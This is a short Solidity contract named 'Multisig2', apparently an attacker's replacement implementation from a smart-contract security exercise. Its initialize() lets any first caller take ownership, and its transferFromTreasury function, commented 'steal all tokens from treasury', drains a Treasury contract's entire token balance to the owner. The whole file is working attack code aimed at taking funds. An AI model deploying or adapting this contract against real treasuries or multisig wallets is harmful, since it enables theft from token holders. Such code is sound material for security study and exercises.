// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "./Treasury.sol";

contract Multisig2 {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function initialize() external {
        require(owner == address(0), "Initialized");
        owner = msg.sender;
    }

    // steal all tokens from treasury
    function transferFromTreasury(address _contract) external onlyOwner {
        IERC20 token = IERC20(Treasury(_contract).token());
        token.transferFrom(_contract, owner, token.balanceOf(_contract));
    }
}
